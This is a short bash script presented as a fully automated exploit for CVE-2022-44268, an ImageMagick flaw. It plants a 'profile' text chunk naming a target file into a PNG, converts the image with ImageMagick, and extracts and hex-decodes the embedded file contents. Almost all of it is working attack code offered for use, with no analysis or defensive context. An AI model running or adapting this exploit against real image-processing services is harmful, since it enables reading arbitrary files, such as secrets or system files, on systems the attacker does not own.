#!/bin/bash

# Color
RED='\033[0;31m'
GREEN='\033[0;32m'
BWhite='\033[1;37m'  
NC='\033[0m' # No Color

echo -e "$RED[+] Fully Automated CVE-2022-44268 [+] $NC"

read -p "Enter the PNG file (Absolute Path) : " img_png
read -p "File to Read (Absolute path) : " file_path

echo -e "[+] Modifying png \n->Entered PNG file:${RED} $img_png ${NC}\n->Entered File to read: ${RED} $file_path ${NC}" 

echo -e "[+] ${RED}Backing up ${NC} original image."
cp $img_png "$img_png.original"

pngcrush -text a "profile" "$file_path" $img_png

echo -e "${BWhite}[+] Examining the Exif Data.${NC}"
exiv2 -pS pngout.png

echo -e "${BWhite}[+] Converting the png to Malicious image.${NC}"
convert pngout.png /tmp/malicious.png

echo -e "${GREEN}[+] Decrypting Data------[+]${NC}"
hex_data=$(identify -verbose /tmp/malicious.png | sed -n '/Raw profile/,/signature/p'  | head -n -2 | tail -n +4 | tr -d '\n')
echo $hex_data |xxd -p -r

echo -e "${GREEN}[+] Decrypting Done!------[+]${NC}"
echo -e "${BWhite}[+] Clearing modified images.${NC}"
rm pngout.png /tmp/malicious.png

echo "[+] Restoring original image."
mv "$img_png.original" $img_png
echo -e "${RED}[+] Original image Restored.${NC}"
